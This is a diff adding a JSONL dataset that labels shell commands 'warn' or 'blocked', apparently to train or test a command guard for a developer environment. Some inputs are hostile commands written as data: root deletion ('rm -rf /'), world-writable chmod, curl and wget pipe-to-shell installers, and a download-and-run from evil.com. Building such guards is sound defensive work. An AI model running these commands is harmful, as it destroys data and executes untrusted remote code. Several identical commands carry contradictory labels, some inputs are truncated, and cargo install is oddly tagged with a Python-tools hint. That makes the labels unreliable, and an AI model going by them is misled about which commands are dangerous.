@@ -1,0 +1,301 @@
+{"instruction": "Classify this command for guard checking", "input": "git checkout -b my-branch", "output": "warn: branch name should use type/description format (e.g. feat/add-widget)"}
+{"instruction": "Classify this command for guard checking", "input": "sudo rm -rf /", "output": "blocked: destructive root deletion"}
+{"instruction": "Classify this command for guard checking", "input": "cargo install --list", "output": "warn: consider uv tool install for Python tools"}
+{"instruction": "Classify this command for guard checking", "input": "git switch -c fix/logout main", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout -b update_1", "output": "warn: branch name should use type/description format (e.g. feat/add-widget)"}
+{"instruction": "Classify this command for guard checking", "input": "apt install nodejs npm", "output": "warn: consider using nix or uv for packages"}
+{"instruction": "Classify this command for guard checking", "input": "conda install -c defaults tensorflow", "output": "warn: use uv (conda env not used in b00t hive; use uv venv + uv pip)"}
+{"instruction": "Classify this command for guard checking", "input": "huggingface-cli download bert-base-uncased config.json", "output": "warn -> hf download"}
+{"instruction": "Classify this command for guard checking", "input": "conda install -c conda-forge jupyterlab", "output": "warn: use uv (conda env not used in b00t hive; use uv venv + uv pip)"}
+{"instruction": "Classify this command for guard checking", "input": "npm install vite @vitejs/plugin-react", "output": "warn: use pnpm install instead of npm"}
+{"instruction": "Classify this command for guard checking", "input": "pip3 install 'rich>=12.0'", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "git switch main", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "vllm serve --dtype auto --api-key secret mistralai/Mixtral-8x7B", "output": "warn: prefer using podman to serve vLLM"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout upstream master", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "vllm serve meta-llama/Llama-2-7b", "output": "blocked: Parse-time guard triggered \u2014 command blocked"}
+{"instruction": "Classify this command for guard checking", "input": "npm install -g", "output": "warn: prefer pnpm add -g for global JS tools (b00t hive uses pnpm)"}
+{"instruction": "Classify this command for guard checking", "input": "pip install 'transformers>=4.30'", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "npm install -g http-server", "output": "warn: prefer pnpm add -g for global JS tools (b00t hive uses pnpm)"}
+{"instruction": "Classify this command for guard checking", "input": "chmod 777 ./node_modules", "output": "blocked: dangerous permissions \u2014 use more restrictive modes"}
+{"instruction": "Classify this command for guard checking", "input": "git push origin main:refs/for/main", "output": "blocked: pushing to main \u2014 create a PR instead"}
+{"instruction": "Classify this command for guard checking", "input": "python3 -m pip install flask", "output": "warn -> uv pip"}
+{"instruction": "Classify this command for guard checking", "input": "apt install htop neofetch", "output": "warn: consider using nix or uv for packages"}
+{"instruction": "Classify this command for guard checking", "input": "pip install numpy pandas scipy", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "wget https://script.example.com/bootstrap.sh; chmod +x bootstrap.sh; ./bootstrap.sh", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout -b mybranch", "output": "warn: branch name should use type/description format (e.g. feat/add-widget)"}
+{"instruction": "Classify this command for guard checking", "input": "docker build --target builder -t build-cache .", "output": "warn -> podman build"}
+{"instruction": "Classify this command for guard checking", "input": "git switch -c patch", "output": "warn: branch name should use type/description format (e.g. feat/add-widget)"}
+{"instruction": "Classify this command for guard checking", "input": "vllm serve --kv-cache-dtype fp8 NousResearch/Meta-Llama-3-8B", "output": "warn: prefer using podman to serve vLLM"}
+{"instruction": "Classify this command for guard checking", "input": "chmod 777 config.json", "output": "blocked: dangerous permissions \u2014 use more restrictive modes"}
+{"instruction": "Classify this command for guard checking", "input": "git merge main --allow-unrelated-histories", "output": "blocked: merging main \u2014 use gh pr merge or rebase flow"}
+{"instruction": "Classify this command for guard checking", "input": "huggingface-cli download gpt2", "output": "blocked: Parse-time guard triggered \u2014 command blocked"}
+{"instruction": "Classify this command for guard checking", "input": "chmod 777 /tmp/build", "output": "blocked: dangerous permissions \u2014 use more restrictive modes"}
+{"instruction": "Classify this command for guard checking", "input": "chmod 777 /var/log/app.log", "output": "blocked: dangerous permissions \u2014 use more restrictive modes"}
+{"instruction": "Classify this command for guard checking", "input": "curl https://sh.rustup.rs -sSf | sh", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "chmod 777 script.sh", "output": "blocked: dangerous permissions \u2014 use more restrictive modes"}
+{"instruction": "Classify this command for guard checking", "input": "curl -L https://nixos.org/nix/install | sh", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "conda install --yes pandas", "output": "warn: use uv (conda env not used in b00t hive; use uv venv + uv pip)"}
+{"instruction": "Classify this command for guard checking", "input": "conda install --file requirements.txt", "output": "warn: use uv (conda env not used in b00t hive; use uv venv + uv pip)"}
+{"instruction": "Classify this command for guard checking", "input": "git commit -m \"update dependencies\"", "output": "warn: commit message should follow Conventional Commits: type(scope): description"}
+{"instruction": "Classify this command for guard checking", "input": "git push --force origin develop", "output": "warn: force push detected \u2014 confirm branch is not main/master"}
+{"instruction": "Classify this command for guard checking", "input": "git push --force", "output": "warn: force push detected \u2014 confirm branch is not main/master"}
+{"instruction": "Classify this command for guard checking", "input": "git commit -m \"update readme\"", "output": "warn: commit message should follow Conventional Commits: type(scope): description"}
+{"instruction": "Classify this command for guard checking", "input": "git reset --hard tags/release-1.0", "output": "warn: hard reset will discard uncommitted changes; checkpoint first with: git stash"}
+{"instruction": "Classify this command for guard checking", "input": "docker run -v /data:/data --device nvidia.com/gpu=all myimage", "output": "warn: use podman run (CDI GPU passthrough: --device nvidia.com/gpu=all --security-opt=label=disable)"}
+{"instruction": "Classify this command for guard checking", "input": "ulimit -n 4096", "output": "warn: ulimit only affects current shell; systemd services use LimitNOFILE=65536"}
+{"instruction": "Classify this command for guard checking", "input": "wget -O- http://example.com/install | sh -s -- --unstable", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "ulimit -n 128000", "output": "warn: ulimit only affects current shell; systemd services use LimitNOFILE=65536"}
+{"instruction": "Classify this command for guard checking", "input": "ulimit -n 16384", "output": "warn: ulimit only affects current shell; systemd services use LimitNOFILE=65536"}
+{"instruction": "Classify this command for guard checking", "input": "curl -fsSL https://deno.land/install.sh | sh", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "docker run --network host myapp:latest", "output": "warn: use podman run (CDI GPU passthrough: --device nvidia.com/gpu=all --security-opt=label=disable)"}
+{"instruction": "Classify this command for guard checking", "input": "vllm serve mistralai/Mistral-7B-v0.1 --port 8000", "output": "warn: prefer using podman to serve vLLM"}
+{"instruction": "Classify this command for guard checking", "input": "apt install cmake pkg-config", "output": "warn: consider using nix or uv for packages"}
+{"instruction": "Classify this command for guard checking", "input": "npm install -g create-react-app", "output": "warn: prefer pnpm add -g for global JS tools (b00t hive uses pnpm)"}
+{"instruction": "Classify this command for guard checking", "input": "curl -sSL https://get.docker.com | bash", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "brew install zsh-completions", "output": "warn: b00t hive is linux; use apt, cargo install, or uv tool install"}
+{"instruction": "Classify this command for guard checking", "input": "ulimit -n 8192", "output": "warn: ulimit only affects current shell; systemd services use LimitNOFILE=65536"}
+{"instruction": "Classify this command for guard checking", "input": "cargo install --path .", "output": "warn: consider uv tool install for Python tools"}
+{"instruction": "Classify this command for guard checking", "input": "pip install --no-cache-dir jupyter", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "docker-compose", "output": "warn: use podman-compose or podman play kube"}
+{"instruction": "Classify this command for guard checking", "input": "python3 -m pip install --user pytest", "output": "warn -> uv pip"}
+{"instruction": "Classify this command for guard checking", "input": "git merge --no-ff main", "output": "blocked: merging main \u2014 use gh pr merge or rebase flow"}
+{"instruction": "Classify this command for guard checking", "input": "npm install -g nodemon", "output": "warn: prefer pnpm add -g for global JS tools (b00t hive uses pnpm)"}
+{"instruction": "Classify this command for guard checking", "input": "cargo install --git https://github.com/user/repo", "output": "warn: consider uv tool install for Python tools"}
+{"instruction": "Classify this command for guard checking", "input": "npm install -g typescript", "output": "warn: prefer pnpm add -g for global JS tools (b00t hive uses pnpm)"}
+{"instruction": "Classify this command for guard checking", "input": "wget -qO- https://get.docker.com | sh", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "brew install git-lfs", "output": "warn: b00t hive is linux; use apt, cargo install, or uv tool install"}
+{"instruction": "Classify this command for guard checking", "input": "curl https://bootstrap.pypa.io/get-pip.py | python3", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "huggingface-cli download meta-llama/Llama-2-7b", "output": "warn -> hf download"}
+{"instruction": "Classify this command for guard checking", "input": "git merge main", "output": "blocked: merging main \u2014 use gh pr merge or rebase flow"}
+{"instruction": "Classify this command for guard checking", "input": "conda install pytorch torchvision -c pytorch", "output": "warn: use uv (conda env not used in b00t hive; use uv venv + uv pip)"}
+{"instruction": "Classify this command for guard checking", "input": "docker-compose logs -f --tail=100", "output": "warn: use podman-compose or podman play kube"}
+{"instruction": "Classify this command for guard checking", "input": "npm install -g pnpm", "output": "warn: prefer pnpm add -g for global JS tools (b00t hive uses pnpm)"}
+{"instruction": "Classify this command for guard checking", "input": "docker run -d -p 8080:80 nginx", "output": "warn: use podman run (CDI GPU passthrough: --device nvidia.com/gpu=all --security-opt=label=disable)"}
+{"instruction": "Classify this command for guard checking", "input": "ulimit -n 100000", "output": "warn: ulimit only affects current shell; systemd services use LimitNOFILE=65536"}
+{"instruction": "Classify this command for guard checking", "input": "git push -f origin refactor/code", "output": "warn: force push detected \u2014 confirm branch is not main/master"}
+{"instruction": "Classify this command for guard checking", "input": "curl -sSL https://get.volta.sh | bash", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "pip install -e .", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "pip install --user black", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "npm install --no-audit tailwindcss", "output": "warn: use pnpm install instead of npm"}
+{"instruction": "Classify this command for guard checking", "input": "npm install --ignore-scripts sharp", "output": "warn: use pnpm install instead of npm"}
+{"instruction": "Classify this command for guard checking", "input": "wget -O- https://example.com/setup | sudo bash", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout remotes/origin/main", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "curl -sS https://example.com/install.sh | bash", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "git switch master", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout main --  # restore files from main", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "npm install @mui/material @emotion/react", "output": "warn: use pnpm install instead of npm"}
+{"instruction": "Classify this command for guard checking", "input": "npm install react react-dom", "output": "warn: use pnpm install instead of npm"}
+{"instruction": "Classify this command for guard checking", "input": "ulimit -n unlimited", "output": "warn: ulimit only affects current shell; systemd services use LimitNOFILE=65536"}
+{"instruction": "Classify this command for guard checking", "input": "conda install numpy scipy matplotlib", "output": "warn: use uv (conda env not used in b00t hive; use uv venv + uv pip)"}
+{"instruction": "Classify this command for guard checking", "input": "rhai:cmd.conta", "output": "warn: guard expression matched"}
+{"instruction": "Classify this command for guard checking", "input": "rhai:cmd.contains(\"git commit\") && cmd.contains(\"-m\") && !cmd.contains(\":\")", "output": "warn: commit message should follow Conventional Commits"}
+{"instruction": "Classify this command for guard checking", "input": "docker-compose exec app bash", "output": "warn: use podman-compose or podman play kube"}
+{"instruction": "Classify this command for guard checking", "input": "cargo install bat", "output": "warn: consider uv tool install for Python tools"}
+{"instruction": "Classify this command for guard checking", "input": "curl -sSL https://get.rustup.sh | sh", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "vllm serve --model facebook/opt-1.3b --max-model-len 2048", "output": "warn: prefer using podman to serve vLLM"}
+{"instruction": "Classify this command for guard checking", "input": "git push --force origin HEAD", "output": "warn: force push detected \u2014 confirm branch is not main/master"}
+{"instruction": "Classify this command for guard checking", "input": "docker build --no-cache -t myimage:v1 .", "output": "warn -> podman build"}
+{"instruction": "Classify this command for guard checking", "input": "brew install", "output": "warn: b00t hive is linux; use apt, cargo install, or uv tool install"}
+{"instruction": "Classify this command for guard checking", "input": "git reset --hard origin/main", "output": "warn: hard reset will discard uncommitted changes; checkpoint first with: git stash"}
+{"instruction": "Classify this command for guard checking", "input": "apt install postgresql postgresql-contrib", "output": "warn: consider using nix or uv for packages"}
+{"instruction": "Classify this command for guard checking", "input": "git push -f --all origin", "output": "warn: force push detected \u2014 confirm branch is not main/master"}
+{"instruction": "Classify this command for guard checking", "input": "huggingface-cli download --resume-download bigscience/bloom-3b", "output": "warn -> hf download"}
+{"instruction": "Classify this command for guard checking", "input": "git reset --hard abc1234", "output": "warn: hard reset will discard uncommitted changes; checkpoint first with: git stash"}
+{"instruction": "Classify this command for guard checking", "input": "vllm serve --served-model-name mymodel ./local-model", "output": "warn: prefer using podman to serve vLLM"}
+{"instruction": "Classify this command for guard checking", "input": "git push --force origin main", "output": "blocked: Parse-time guard triggered \u2014 command blocked"}
+{"instruction": "Classify this command for guard checking", "input": "chmod 777 /path/to/file", "output": "blocked: dangerous permissions \u2014 use more restrictive modes"}
+{"instruction": "Classify this command for guard checking", "input": "rm -rf /etc", "output": "blocked: destructive root deletion"}
+{"instruction": "Classify this command for guard checking", "input": "brew install python@3.11", "output": "blocked: Parse-time guard triggered \u2014 command blocked"}
+{"instruction": "Classify this command for guard checking", "input": "conda install python=3.11", "output": "warn: use uv (conda env not used in b00t hive; use uv venv + uv pip)"}
+{"instruction": "Classify this command for guard checking", "input": "python -m pip install --upgrade pip", "output": "warn -> uv pip"}
+{"instruction": "Classify this command for guard checking", "input": "rm -rf /", "output": "blocked: destructive root deletion"}
+{"instruction": "Classify this command for guard checking", "input": "docker-compose up -d", "output": "warn: use podman-compose or podman play kube"}
+{"instruction": "Classify this command for guard checking", "input": "git push --force upstream feature", "output": "warn: force push detected \u2014 confirm branch is not main/master"}
+{"instruction": "Classify this command for guard checking", "input": "pip install", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "vllm serve gpt2 --tensor-parallel-size 2", "output": "warn: prefer using podman to serve vLLM"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout remotes/origin/master", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout -b feat/new-feature main", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "cargo install ripgrep", "output": "warn: consider uv tool install for Python tools"}
+{"instruction": "Classify this command for guard checking", "input": "git commit -m \"merge conflicts resolved\"", "output": "warn: commit message should follow Conventional Commits: type(scope): description"}
+{"instruction": "Classify this command for guard checking", "input": "npm install -g eslint prettier", "output": "warn: prefer pnpm add -g for global JS tools (b00t hive uses pnpm)"}
+{"instruction": "Classify this command for guard checking", "input": "apt install redis-server", "output": "warn: consider using nix or uv for packages"}
+{"instruction": "Classify this command for guard checking", "input": "cargo install --force cargo-edit", "output": "warn: consider uv tool install for Python tools"}
+{"instruction": "Classify this command for guard checking", "input": "huggingface-cli download stabilityai/stable-diffusion-2-1", "output": "warn -> hf download"}
+{"instruction": "Classify this command for guard checking", "input": "pip3 install torch torchvision", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "huggingface-cli download gpt2 --local-dir ./models", "output": "warn -> hf download"}
+{"instruction": "Classify this command for guard checking", "input": "rm -rf /var", "output": "blocked: destructive root deletion"}
+{"instruction": "Classify this command for guard checking", "input": "conda install", "output": "warn: use uv (conda env not used in b00t hive; use uv venv + uv pip)"}
+{"instruction": "Classify this command for guard checking", "input": "docker build", "output": "warn -> podman build"}
+{"instruction": "Classify this command for guard checking", "input": "vllm serve meta-llama/Llama-2-7b-hf", "output": "warn: prefer using podman to serve vLLM"}
+{"instruction": "Classify this command for guard checking", "input": "docker-compose down --volumes", "output": "warn: use podman-compose or podman play kube"}
+{"instruction": "Classify this command for guard checking", "input": "rm -rf /usr", "output": "blocked: destructive root deletion"}
+{"instruction": "Classify this command for guard checking", "input": "chmod 777 uploads/", "output": "blocked: dangerous permissions \u2014 use more restrictive modes"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout origin main", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "pip install flask==2.3.0", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "pip inst", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "git push --force origin main", "output": "warn: force push detected \u2014 confirm branch is not main/master"}
+{"instruction": "Classify this command for guard checking", "input": "git merge --squash main", "output": "blocked: merging main \u2014 use gh pr merge or rebase flow"}
+{"instruction": "Classify this command for guard checking", "input": "npm install --legacy-peer-deps graphql", "output": "warn: use pnpm install instead of npm"}
+{"instruction": "Classify this command for guard checking", "input": "npm install --save-dev jest", "output": "warn: use pnpm install instead of npm"}
+{"instruction": "Classify this command for guard checking", "input": "git reset --hard upstream/feature", "output": "warn: hard reset will discard uncommitted changes; checkpoint first with: git stash"}
+{"instruction": "Classify this command for guard checking", "input": "curl -fsSL https://deb.nodesource.com/setup_20.x | bash", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "docker build -t myapp:latest .", "output": "warn -> podman build"}
+{"instruction": "Classify this command for guard checking", "input": "git commit -m \"add new feature\"", "output": "warn: commit message should follow Conventional Commits: type(scope): description"}
+{"instruction": "Classify this command for guard checking", "input": "rm -rf /home", "output": "blocked: destructive root deletion"}
+{"instruction": "Classify this command for guard checking", "input": "python -m pip list --outdated", "output": "warn -> uv pip"}
+{"instruction": "Classify this command for guard checking", "input": "huggingface-cli download sentence-transformers/all-MiniLM-L6-v2", "output": "warn -> hf download"}
+{"instruction": "Classify this command for guard checking", "input": "docker run -it --entrypoint /bin/sh alpine", "output": "warn: use podman run (CDI GPU passthrough: --device nvidia.com/gpu=all --security-opt=label=disable)"}
+{"instruction": "Classify this command for guard checking", "input": "huggingface-cli download microsoft/phi-2", "output": "warn -> hf download"}
+{"instruction": "Classify this command for guard checking", "input": "chmod 777 /shared/data", "output": "blocked: dangerous permissions \u2014 use more restrictive modes"}
+{"instruction": "Classify this command for guard checking", "input": "pip install torch", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "apt install --no-install-recommends curl", "output": "warn: consider using nix or uv for packages"}
+{"instruction": "Classify this command for guard checking", "input": "git push --set-upstream origin main", "output": "blocked: pushing to main \u2014 create a PR instead"}
+{"instruction": "Classify this command for guard checking", "input": "python -m pip", "output": "warn -> uv pip"}
+{"instruction": "Classify this command for guard checking", "input": "sudo rm -rf /*", "output": "blocked: destructive root deletion"}
+{"instruction": "Classify this command for guard checking", "input": "git push origin main --force-with-lease", "output": "blocked: pushing to main \u2014 create a PR instead"}
+{"instruction": "Classify this command for guard checking", "input": "git push --force origin stable", "output": "warn: force push detected \u2014 confirm branch is not main/master"}
+{"instruction": "Classify this command for guard checking", "input": "git commit -m \"fix typo in docs\"", "output": "warn: commit message should follow Conventional Commits: type(scope): description"}
+{"instruction": "Classify this command for guard checking", "input": "npm install --save-prod next", "output": "warn: use pnpm install instead of npm"}
+{"instruction": "Classify this command for guard checking", "input": "python3.11 -m pip install mypy", "output": "warn -> uv pip"}
+{"instruction": "Classify this command for guard checking", "input": "pip install -r requirements.txt", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "pip install torch torchvision", "output": "blocked: Parse-time guard triggered \u2014 command blocked"}
+{"instruction": "Classify this command for guard checking", "input": "docker-compose restart web", "output": "warn: use podman-compose or podman play kube"}
+{"instruction": "Classify this command for guard checking", "input": "wget --no-check-certificate -O - https://badssl.com/run.sh | bash", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "rhai:cmd.contains(\"pip\") && cmd.contains(\"install\")", "output": "warn -> use uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "git push origin main", "output": "blocked: pushing to main \u2014 create a PR instead"}
+{"instruction": "Classify this command for guard checking", "input": "apt install libssl-dev libffi-dev", "output": "warn: consider using nix or uv for packages"}
+{"instruction": "Classify this command for guard checking", "input": "chmod 777 storage/framework/cache", "output": "blocked: dangerous permissions \u2014 use more restrictive modes"}
+{"instruction": "Classify this command for guard checking", "input": "git commit -m \"initial commit\"", "output": "warn: commit message should follow Conventional Commits: type(scope): description"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout master", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "npm install -g pm2", "output": "warn: prefer pnpm add -g for global JS tools (b00t hive uses pnpm)"}
+{"instruction": "Classify this command for guard checking", "input": "stage:pre_parse", "output": "blocked: Parse-time guard triggered \u2014 command blocked"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout origin master", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "conda install pydantic fastapi uvicorn", "output": "warn: use uv (conda env not used in b00t hive; use uv venv + uv pip)"}
+{"instruction": "Classify this command for guard checking", "input": "python -m pip install 'requests>=2.28'", "output": "warn -> uv pip"}
+{"instruction": "Classify this command for guard checking", "input": "pip", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "python -m pip install numpy", "output": "warn -> uv pip"}
+{"instruction": "Classify this command for guard checking", "input": "huggingface-cli download google/flan-t5-xl --quiet", "output": "warn -> hf download"}
+{"instruction": "Classify this command for guard checking", "input": "ulimit -n 65536", "output": "warn: ulimit only affects current shell; systemd services use LimitNOFILE=65536"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout -b newfeature", "output": "warn: branch name should use type/description format (e.g. feat/add-widget)"}
+{"instruction": "Classify this command for guard checking", "input": "apt install build-essential", "output": "warn: consider using nix or uv for packages"}
+{"instruction": "Classify this command for guard checking", "input": "git reset --hard HEAD", "output": "warn: hard reset will discard uncommitted changes; checkpoint first with: git stash"}
+{"instruction": "Classify this command for guard checking", "input": "git commit -m \"bump version to 2.0\"", "output": "warn: commit message should follow Conventional Commits: type(scope): description"}
+{"instruction": "Classify this command for guard checking", "input": "git merge --ff-only main", "output": "blocked: merging main \u2014 use gh pr merge or rebase flow"}
+{"instruction": "Classify this command for guard checking", "input": "npm install -g @angular/cli", "output": "warn: prefer pnpm add -g for global JS tools (b00t hive uses pnpm)"}
+{"instruction": "Classify this command for guard checking", "input": "pip3 install pandas", "output": "blocked: Parse-time guard triggered \u2014 command blocked"}
+{"instruction": "Classify this command for guard checking", "input": "git switch -c fixstuff", "output": "warn: branch name should use type/description format (e.g. feat/add-widget)"}
+{"instruction": "Classify this command for guard checking", "input": "ulimit -n 50000", "output": "warn: ulimit only affects current shell; systemd services use LimitNOFILE=65536"}
+{"instruction": "Classify this command for guard checking", "input": "npm install -g typescript", "output": "blocked: Parse-time guard triggered \u2014 command blocked"}
+{"instruction": "Classify this command for guard checking", "input": "wget https://example.com/script.sh && bash script.sh", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "conda install -c nvidia cuda-toolkit", "output": "warn: use uv (conda env not used in b00t hive; use uv venv + uv pip)"}
+{"instruction": "Classify this command for guard checking", "input": "docker-compose ps --services", "output": "warn: use podman-compose or podman play kube"}
+{"instruction": "Classify this command for guard checking", "input": "conda install flask gunicorn", "output": "warn: use uv (conda env not used in b00t hive; use uv venv + uv pip)"}
+{"instruction": "Classify this command for guard checking", "input": "brew install neovim --HEAD", "output": "warn: b00t hive is linux; use apt, cargo install, or uv tool install"}
+{"instruction": "Classify this command for guard checking", "input": "git switch -c docs/readme master", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "docker run", "output": "warn: use podman run (CDI GPU passthrough: --device nvidia.com/gpu=all --security-opt=label=disable)"}
+{"instruction": "Classify this command for guard checking", "input": "huggingface-cli download --token hf_xxx meta-llama/Llama-2-70b", "output": "warn -> hf download"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout master -- src/main.rs", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "git commit -m \"refactor code\"", "output": "warn: commit message should follow Conventional Commits: type(scope): description"}
+{"instruction": "Classify this command for guard checking", "input": "git commit -m \"clean up warnings\"", "output": "warn: commit message should follow Conventional Commits: type(scope): description"}
+{"instruction": "Classify this command for guard checking", "input": "wget -q -O - https://raw.githubusercontent.com/user/repo/main/install.sh | bash", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "rm -rf /var/log", "output": "blocked: Parse-time guard triggered \u2014 command blocked"}
+{"instruction": "Classify this command for guard checking", "input": "docker build --platform linux/amd64 -t cross-image .", "output": "warn -> podman build"}
+{"instruction": "Classify this command for guard checking", "input": "vllm serve", "output": "warn: prefer using podman to serve vLLM"}
+{"instruction": "Classify this command for guard checking", "input": "cargo install --locked zellij", "output": "warn: consider uv tool install for Python tools"}
+{"instruction": "Classify this command for guard checking", "input": "npm install -g npm@latest", "output": "warn: prefer pnpm add -g for global JS tools (b00t hive uses pnpm)"}
+{"instruction": "Classify this command for guard checking", "input": "git push --force origin feat/my-branch", "output": "warn: force push detected \u2014 confirm branch is not main/master"}
+{"instruction": "Classify this command for guard checking", "input": "pip install git+https://github.com/user/repo.git", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "chmod -R 777 /data", "output": "blocked: dangerous permissions \u2014 use more restrictive modes"}
+{"instruction": "Classify this command for guard checking", "input": "pip3 install flask", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "git commit -m \"fix bug\"", "output": "warn: commit message should follow Conventional Commits: type(scope): description"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout -b temporary_branch", "output": "warn: branch name should use type/description format (e.g. feat/add-widget)"}
+{"instruction": "Classify this command for guard checking", "input": "git push -f origin fix/crash", "output": "warn: force push detected \u2014 confirm branch is not main/master"}
+{"instruction": "Classify this command for guard checking", "input": "git push --all origin", "output": "blocked: pushing to main \u2014 create a PR instead"}
+{"instruction": "Classify this command for guard checking", "input": "docker build --squash -t slim-image .", "output": "warn -> podman build"}
+{"instruction": "Classify this command for guard checking", "input": "curl -s https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh | bash", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "wget https://evil.com/payload.sh -O /tmp/p.sh && bash /tmp/p.sh", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout -b chore/update master", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "docker-compose --project-name myapp up -d", "output": "warn: use podman-compose or podman play kube"}
+{"instruction": "Classify this command for guard checking", "input": "apt install nginx certbot", "output": "warn: consider using nix or uv for packages"}
+{"instruction": "Classify this command for guard checking", "input": "brew install rustup-init", "output": "warn: b00t hive is linux; use apt, cargo install, or uv tool install"}
+{"instruction": "Classify this command for guard checking", "input": "cargo install alacritty", "output": "warn: consider uv tool install for Python tools"}
+{"instruction": "Classify this command for guard checking", "input": "docker-compose build --no-cache", "output": "warn: use podman-compose or podman play kube"}
+{"instruction": "Classify this command for guard checking", "input": "git merge main --strategy-option theirs", "output": "blocked: merging main \u2014 use gh pr merge or rebase flow"}
+{"instruction": "Classify this command for guard checking", "input": "ulimit -n 2048", "output": "warn: ulimit only affects current shell; systemd services use LimitNOFILE=65536"}
+{"instruction": "Classify this command for guard checking", "input": "docker run --rm -v $(pwd):/app python:3.11 python app.py", "output": "warn: use podman run (CDI GPU passthrough: --device nvidia.com/gpu=all --security-opt=label=disable)"}
+{"instruction": "Classify this command for guard checking", "input": "apt install python3 python3-pip", "output": "warn: consider using nix or uv for packages"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout upstream main", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "pip3 install mypy black isort", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout master -- README.md", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "curl -fsSL https://cli.github.com/install.sh | bash", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "git merge origin/main", "output": "blocked: merging main \u2014 use gh pr merge or rebase flow"}
